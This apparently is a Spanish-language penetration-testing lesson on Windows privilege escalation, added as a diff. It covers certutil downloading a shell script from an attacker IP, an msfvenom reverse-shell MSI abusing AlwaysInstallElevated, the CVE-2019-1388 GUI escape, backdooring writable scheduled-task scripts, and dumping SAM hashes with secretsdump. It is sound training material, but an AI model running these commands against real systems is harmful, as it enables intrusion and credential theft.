@@ -1,0 +1,352 @@
+## Living Off The Land Binaries and Scripts (LOLBAS)
+
+El [LOLBAS project](https://lolbas-project.github.io/) documenta binaries, scripts y libraries que se pueden usar para técnicas de "living off the land" en sistemas Windows. Cada uno de estos binaries, scripts y libraries es un archivo firmado por Microsoft que es nativo del sistema operativo o se puede descargar directamente desde Microsoft y tiene funcionalidades inesperadas útiles para un atacante. Algunas funcionalidades interesantes pueden incluir:
+
+| Code execution         | Code compilation | File transfers     |
+|------------------------|-------------------|--------------------|
+| Persistence            | UAC bypass        | Credential theft   |
+| Dumping process memory | Keylogging        | Evasion            |
+| DLL hijacking          |                   |                    |
+
+### Transferring File with Certutil
+
+Un ejemplo clásico es [certutil.exe](https://lolbas-project.github.io/lolbas/Binaries/Certutil/), cuyo uso previsto es para manejar certificados pero también se puede usar para transferir archivos descargando un archivo al disco o codificando/decodificando un archivo en base64.
+
+```r
+PS C:\htb> certutil.exe -urlcache -split -f http://10.10.14.3:8080/shell.bat shell.bat
+```
+
+### Encoding File with Certutil
+
+Podemos usar el flag `-encode` para codificar un archivo usando base64 en nuestro host de ataque Windows y copiar el contenido a un nuevo archivo en el sistema remoto.
+
+```r
+C:\htb> certutil -encode file1 encodedfile
+
+Input Length = 7
+Output Length = 70
+CertUtil: -encode command completed successfully
+```
+
+### Decoding File with Certutil
+
+Una vez creado el nuevo archivo, podemos usar el flag `-decode` para decodificar el archivo de vuelta a su contenido original.
+
+```r
+C:\htb> certutil -decode encodedfile file2
+
+Input Length = 70
+Output Length = 7
+CertUtil: -decode command completed successfully.
+```
+
+Un binary como [rundll32.exe](https://lolbas-project.github.io/lolbas/Binaries/Rundll32/) se puede usar para ejecutar un archivo DLL. Podríamos usar esto para obtener un reverse shell ejecutando un archivo .DLL que descargamos en el host remoto o alojamos nosotros mismos en un SMB share.
+
+Vale la pena revisar este proyecto y familiarizarse con tantos binaries, scripts y libraries como sea posible. Podrían ser muy útiles durante una evaluación evasiva o en una en la que el cliente nos restrinja a solo una instancia gestionada de Windows workstation/server para probar.
+
+---
+
+## Always Install Elevated
+
+Esta configuración se puede establecer a través de Local Group Policy configurando `Always install with elevated privileges` como `Enabled` en las siguientes rutas:
+
+- `Computer Configuration\Administrative Templates\Windows Components\Windows Installer`
+- `User Configuration\Administrative Templates\Windows Components\Windows Installer`
+
+![image](https://academy.hackthebox.com/storage/modules/67/alwaysinstall.png)
+
+### Enumerating Always Install Elevated Settings
+
+Vamos a enumerar esta configuración.
+
+```r
+PS C:\htb> reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
+
+HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
+    AlwaysInstallElevated    REG_DWORD    0x1
+```
+
+```r
+PS C:\htb> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
+
+HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
+    AlwaysInstallElevated    REG_DWORD    0x1
+```
+
+Nuestra enumeración nos muestra que la clave `AlwaysInstallElevated` existe, por lo que la política está habilitada en el sistema objetivo.
+
+### Generating MSI Package
+
+Podemos explotar esto generando un `MSI` package malicioso y ejecutándolo a través de la línea de comandos para obtener un reverse shell con privilegios de SYSTEM.
+
+```r
+msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.3 lport=9443 -f msi > aie.msi
+
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 324 bytes
+Final size of msi file: 159744 bytes
+```
+
+### Executing MSI Package
+
+Podemos subir este archivo MSI a nuestro objetivo, iniciar un listener Netcat y ejecutar el archivo desde la línea de comandos de esta manera:
+
+```r
+C:\htb> msiexec /i c:\users\htb-student\desktop\aie.msi /quiet /qn /norestart
+```
+
+### Catching Shell
+
+Si todo sale según lo planeado, recibiremos una conexión de vuelta como `NT AUTHORITY\SYSTEM`.
+
+```r
+nc -lnvp 9443
+
+listening on [any] 9443 ...
+connect to [10.10.14.3] from (UNKNOWN) [10.129.43.33] 49720
+Microsoft Windows [Version 10.0.18363.592]
+(c) 2019 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+
+whoami
+nt authority\system
+```
+
+Este problema se puede mitigar deshabilitando las dos configuraciones de Local Group Policy mencionadas anteriormente.
+
+---
+
+## CVE-2019-1388
+
+[CVE-2019-1388](https://nvd.nist.gov/vuln/detail/CVE-2019-1388) fue una vulnerabilidad de escalada de privilegios en el Windows Certificate Dialog, que no aplicaba correctamente los privilegios de usuario. El problema estaba en el mecanismo de UAC, que presentaba una opción para mostrar información sobre el certificado de un ejecutable, abriendo el Windows certificate dialog cuando un usuario hacía clic en el enlace. El campo `Issued By` en la pestaña General se renderiza como un hyperlink si el binary está firmado con un certificado que tiene Object Identifier (OID) `1.3.6.1.4.1.311.2.1.10`. Este valor de OID se identifica en el [wintrust.h](https://docs.microsoft.com/en-us/windows/win32/api/wintrust/) header como [SPC_SP_AGENCY_INFO_OBJID](https://docs.microsoft.com/en-us/windows/win32/api/wincrypt/nf-wincrypt-cryptformatobject) que es el campo `SpcSpAgencyInfo` en la pestaña de detalles del certificate dialog. Si está presente, un hyperlink incluido en el campo se renderizará en la pestaña General. Esta vulnerabilidad se puede explotar fácilmente usando un ejecutable antiguo firmado por Microsoft ([hhupd.exe](https://packetstormsecurity.com/files/14437/hhupd.exe.html)) que contiene un certificado con el campo `SpcSpAgencyInfo` poblado con un hyperlink.
+
+Cuando hacemos clic en el hyperlink, se lanzará una ventana del navegador ejecutándose como `NT AUTHORITY\SYSTEM`. Una vez abierto el navegador, es posible "salir" de él aprovechando la opción del menú `View page source` para lanzar una consola `cmd.exe` o `PowerShell.exe` como SYSTEM.
+
+Vamos a revisar la vulnerabilidad en práctica.
+
+Primero, haz clic derecho en el ejecutable `hhupd.exe` y selecciona `Run as administrator` desde el menú.
+
+![image](https://academy.hackthebox.com/storage/modules/67/hhupd.png)
+
+Luego, haz clic en `Show information about the publisher's certificate` para abrir el certificate dialog. Aquí podemos ver que el campo `SpcSpAgencyInfo` está poblado en la pestaña de Detalles.
+
+![image](https://academy.hackthebox.com/storage/modules/67/hhupd_details.png)
+
+Luego, volvemos a la pestaña General y vemos que el campo `Issued by` está poblado con un hyperlink. Haz clic en él y luego haz clic en `OK`, y el certificate dialog se cerrará y se lanzará una ventana del navegador.
+
+![image](https://academy.hackthebox.com/storage/modules/67/hhupd_ok.png)
+
+Si abrimos el `Task Manager`, veremos que la instancia del navegador se lanzó como SYSTEM.
+
+![image](https://academy.hackthebox.com/storage/modules/67/chrome_system.png)
+
+A continuación, podemos hacer clic derecho en cualquier lugar de la página web y elegir `View page source`. Una vez que se abra el código fuente de la página en otra pestaña, haz clic derecho de nuevo y selecciona `Save as`, y se abrirá un cuadro de diálogo `Save As`.
+
+![image](https://academy.hackthebox.com/storage/modules/67/hhupd_saveas.png)
+
+En este punto, podemos lanzar cualquier programa que queramos como SYSTEM. Escribe `c:\windows\system32\cmd.exe` en la ruta del archivo y presiona enter. Si todo sale según lo planeado, tendremos una instancia de cmd.exe ejecutándose como SYSTEM.
+
+![image](https://academy.hackthebox.com/storage/modules/67/hhupd_cmd.png)
+
+Microsoft lanzó un [patch](https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2019-1388) para este problema en noviembre de 2019. Aún así, como muchas organizaciones se retrasan en aplicar parches, siempre debemos verificar esta vulnerabilidad si obtenemos acceso a la GUI de un sistema potencialmente vulnerable como un usuario de bajos privilegios.
+
+Este [link](https://web.archive.org/web/20210620053630/https://gist.github.com/gentilkiwi/802c221c0731c06c22bb75650e884e5a) lista todas las versiones vulnerables de Windows Server y Workstation.
+
+Nota: Los pasos anteriores se realizaron usando el navegador Chrome y pueden diferir ligeramente en otros navegadores.
+
+---
+
+## Scheduled Tasks
+
+### Enumerating Scheduled Tasks
+
+Podemos usar el comando [schtasks](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks) para enumerar scheduled tasks en el sistema.
+
+```r
+C:\htb>  schtasks /query /fo LIST /v
+ 
+Folder: \
+INFO: There are no scheduled tasks presently available at your access level.
+ 
+Folder: \Microsoft
+INFO: There are no scheduled tasks presently available at your access level.
+ 
+Folder: \Microsoft\Windows
+INFO: There are no scheduled tasks presently available at your access level.
+ 
+Folder: \Microsoft\Windows\.NET Framework
+HostName:                             WINLPE-SRV01
+TaskName:                             \Microsoft\Windows\.NET Framework\.NET Framework NGEN v4.0.30319
+Next Run Time:                        N/A
+Status:                               Ready
+Logon Mode:                           Interactive/Background
+Last Run Time:                        5/27/2021 12:23:27 PM
+Last Result:                          0
+Author:                               N/A
+Task To Run:                          COM handler
+Start In:                             N/A
+Comment:                              N/A
+Scheduled Task State:                 Enabled
+Idle Time:                            Disabled
+Power Management:                     Stop On Battery Mode, No Start On Batteries
+Run As User:                          SYSTEM
+Delete Task If Not Rescheduled:       Disabled
+Stop Task If Runs X Hours and X Mins: 02:00:00
+Schedule:                             Scheduling data is not available in this format.
+Schedule Type:                        On demand only
+Start Time:                           N/A
+Start Date:                           N/A
+End Date:                             N/A
+Days:                                 N/A
+Months:                               N/A
+Repeat: Every:                        N/A
+Repeat: Until: Time:                  N/A
+Repeat: Until: Duration:              N/A
+Repeat: Stop If Still Running:        N/A
+
+<SNIP>
+```
+
+### Enumerating Scheduled Tasks with PowerShell
+
+También podemos enumerar scheduled tasks usando el cmdlet de PowerShell [Get-ScheduledTask](https://docs.microsoft.com/en-us/powershell/module/scheduledtasks/get-scheduledtask?view=windowsserver2019-ps).
+
+```r
+PS C:\htb> Get-ScheduledTask | select TaskName,State
+ 
+TaskName                                                State
+--------                                                -----
+.NET Framework NGEN v4.0.30319                          Ready
+.NET Framework NGEN v4.0.30319 64                       Ready
+.NET Framework NGEN v4.0.30319 64 Critical           Disabled
+.NET Framework NGEN v4.0.30319 Critical              Disabled
+AD RMS Rights Policy Template Management (Automated) Disabled
+AD RMS Rights Policy Template Management (Manual)       Ready
+PolicyConverter                                      Disabled
+SmartScreenSpecific                                     Ready
+VerifiedPublisherCertStoreCheck                      Disabled
+Microsoft Compatibility Appraiser                       Ready
+ProgramDataUpdater                                      Ready
+StartupAppTask                                          Ready
+appuriverifierdaily                                     Ready
+appuriverifierinstall                                   Ready
+CleanupTemporaryState                                   Ready
+DsSvcCleanup                                            Ready
+Pre-staged app cleanup                               Disabled
+
+<SNIP>
+```
+
+Por defecto, solo podemos ver tasks creadas por nuestro usuario y scheduled tasks predeterminadas que tiene cada sistema operativo Windows. Desafortunadamente, no podemos listar scheduled tasks creadas por otros usuarios (como admins) porque están almacenadas en `C:\Windows\System32\Tasks`, a las que los usuarios estándar no tienen acceso de lectura. No es raro que los administradores del sistema vayan en contra de las prácticas de seguridad y realicen acciones como proporcionar acceso de lectura o escritura a una carpeta que generalmente está reservada solo para administradores. Podríamos encontrar una scheduled task que se ejecute como administrador configurada con permisos de archivo/carpeta débiles por cualquier número de razones. En este caso, podríamos editar la task para realizar una acción no intencionada o modificar un script ejecutado por la scheduled task.
+
+### Checking Permissions on C:\Scripts Directory
+
+Considera un escenario en el que estamos en el cuarto día de un compromiso de prueba de penetración de dos semanas. Hemos obtenido acceso a un puñado de sistemas hasta ahora como usuarios no privilegiados y hemos agotado todas las opciones
+
+ para la escalada de privilegios. Justo en ese momento, notamos un directorio `C:\Scripts` escribible que pasamos por alto en nuestra enumeración inicial.
+
+```r
+C:\htb> .\accesschk64.exe /accepteula -s -d C:\Scripts\
+ 
+Accesschk v6.13 - Reports effective permissions for securable objects
+Copyright ⌐ 2006-2020 Mark Russinovich
+Sysinternals - www.sysinternals.com
+ 
+C:\Scripts
+  RW BUILTIN\Users
+  RW NT AUTHORITY\SYSTEM
+  RW BUILTIN\Administrators
+```
+
+Notamos varios scripts en este directorio, como `db-backup.ps1`, `mailbox-backup.ps1`, etc., que también son todos escribibles por el grupo `BUILTIN\USERS`. En este punto, podemos agregar un fragmento de código a uno de estos archivos con la suposición de que al menos uno de ellos se ejecuta a diario, si no con más frecuencia. Escribimos un comando para enviar un beacon de vuelta a nuestra infraestructura C2 y continuamos con las pruebas. A la mañana siguiente, cuando iniciamos sesión, notamos un solo beacon como `NT AUTHORITY\SYSTEM` en el host DB01. Ahora podemos asumir con seguridad que uno de los scripts de respaldo se ejecutó durante la noche y ejecutó nuestro código añadido en el proceso. Este es un ejemplo de cuán importante puede ser incluso el más mínimo bit de información que descubrimos durante la enumeración para el éxito de nuestro compromiso. La enumeración y post-explotación durante una evaluación son procesos iterativos. Cada vez que realizamos la misma tarea en diferentes sistemas, podemos obtener más piezas del rompecabezas que, al juntarse, nos llevarán a nuestro objetivo.
+
+---
+
+## User/Computer Description Field
+
+### Checking Local User Description Field
+
+Aunque es más común en Active Directory, es posible que un sysadmin almacene detalles de la cuenta (como una contraseña) en el campo de descripción de una cuenta de computadora o usuario. Podemos enumerar esto rápidamente para usuarios locales usando el cmdlet [Get-LocalUser](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.localaccounts/get-localuser?view=powershell-5.1).
+
+```r
+PS C:\htb> Get-LocalUser
+ 
+Name            Enabled Description
+----            ------- -----------
+Administrator   True    Built-in account for administering the computer/domain
+DefaultAccount  False   A user account managed by the system.
+Guest           False   Built-in account for guest access to the computer/domain
+helpdesk        True
+htb-student     True
+htb-student_adm True
+jordan          True
+logger          True
+sarah           True
+sccm_svc        True
+secsvc          True    Network scanner - do not change password
+sql_dev         True
+```
+
+### Enumerating Computer Description Field with Get-WmiObject Cmdlet
+
+También podemos enumerar el campo de descripción de la computadora a través de PowerShell usando el cmdlet [Get-WmiObject](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-wmiobject?view=powershell-5.1) con la clase [Win32_OperatingSystem](https://docs.microsoft.com/en-us/windows/win32/cimwin32prov/win32-operatingsystem).
+
+```r
+PS C:\htb> Get-WmiObject -Class Win32_OperatingSystem | select Description
+ 
+Description
+-----------
+The most vulnerable box ever!
+```
+
+---
+
+## Mount VHDX/VMDK
+
+Durante nuestra enumeración, a menudo encontraremos archivos interesantes tanto localmente como en unidades de red compartidas. Podemos encontrar contraseñas, claves SSH u otros datos que se pueden usar para aumentar nuestro acceso. La herramienta [Snaffler](https://github.com/SnaffCon/Snaffler) puede ayudarnos a realizar una enumeración exhaustiva que no podríamos realizar manualmente. La herramienta busca muchos tipos de archivos interesantes, como archivos que contienen la frase "pass" en el nombre del archivo, archivos de base de datos KeePass, claves SSH, archivos web.config y muchos más.
+
+Tres tipos específicos de archivos de interés son `.vhd`, `.vhdx` y `.vmdk`. Estos son `Virtual Hard Disk`, `Virtual Hard Disk v2` (ambos utilizados por Hyper-V) y `Virtual Machine Disk` (utilizado por VMware). Supongamos que llegamos a un servidor web y no tuvimos suerte escalando privilegios, por lo que recurrimos a buscar en unidades compartidas de red. Encontramos una unidad de backups que aloja una variedad de archivos `.VMDK` y `.VHDX` cuyos nombres de archivo coinciden con nombres de host en la red. Uno de estos archivos coincide con un host en el que no tuvimos éxito en escalar privilegios, pero es clave para nuestra evaluación porque hay una sesión de administrador de Active Domain. Si podemos escalar a SYSTEM, probablemente podamos robar el NTLM password hash del usuario o el Kerberos TGT ticket y tomar el control del dominio.
+
+Si encontramos alguno de estos tres archivos, tenemos opciones para montarlos en nuestras cajas de ataque Linux o Windows locales. Si podemos montar una unidad compartida desde nuestra caja de ataque Linux o copiar uno de estos archivos, podemos montarlos y explorar los varios archivos y carpetas del sistema operativo como si estuviéramos conectados a ellos usando los siguientes comandos.
+
+### Mount VMDK on Linux
+
+```r
+guestmount -a SQL01-disk1.vmdk -i --ro /mnt/vmdk
+```
+
+### Mount VHD/VHDX on Linux
+
+```r
+guestmount --add WEBSRV10.vhdx  --ro /mnt/vhdx/ -m /dev/sda1
+```
+
+En Windows, podemos hacer clic derecho en el archivo y elegir `Mount`, o usar la utilidad `Disk Management` para montar un archivo `.vhd` o `.vhdx`. Si lo preferimos, podemos usar el cmdlet de PowerShell [Mount-VHD](https://docs.microsoft.com/en-us/powershell/module/hyper-v/mount-vhd?view=windowsserver2019-ps). Independientemente del método, una vez que hacemos esto, el virtual hard disk aparecerá como una unidad con letra que luego podemos explorar.
+
+![image](https://academy.hackthebox.com/storage/modules/67/mount.png)
+
+Para un archivo `.vmdk`, podemos hacer clic derecho y elegir `Map Virtual Disk` desde el menú. A continuación, se nos pedirá que seleccionemos una letra de unidad. Si todo sale según lo planeado, podemos explorar los archivos y directorios del sistema operativo objetivo. Si esto falla, podemos usar VMWare Workstation `File --> Map Virtual Disks` para mapear el disco en nuestro sistema base. También podríamos agregar el archivo `.vmdk` a nuestra VM de ataque como un virtual hard drive adicional, y luego acceder a él como una unidad con letra. Incluso podemos usar `7-Zip` para extraer datos de un archivo `.vmdk`. Esta [guía](https://www.nakivo.com/blog/extract-content-vmdk-files-step-step-guide/) ilustra muchos métodos para acceder a los archivos en un archivo `.vmdk`.
+
+### Retrieving Hashes using Secretsdump.py
+
+¿Por qué nos interesa un virtual hard drive (especialmente Windows)? Si podemos localizar una copia de seguridad de una máquina en vivo, podemos acceder al directorio `C:\Windows\System32\Config` y descargar los registros `SAM`, `SECURITY` y `SYSTEM`. Luego, podemos usar una herramienta como [secretsdump](https://github.com/SecureAuthCorp/impacket/blob/master/impacket/examples/secretsdump.py) para extraer los password hashes para usuarios locales.
+
+```r
+secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL
+
+Impacket v0.9.23.dev1+20201209.133255.ac307704 - Copyright 2020 SecureAuth Corporation
+
+[*] Target system bootKey: 0x35fb33959c691334c2e4297207eeeeba
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+[*] Dumping cached domain logon information (domain/username:hash)
+
+<SNIP>
+```
+
+Podríamos tener suerte y recuperar el local administrator password hash para el sistema objetivo o encontrar un old local administrator password hash que funcione en otros sistemas en el entorno (ambos casos me han sucedido en bastantes evaluaciones).
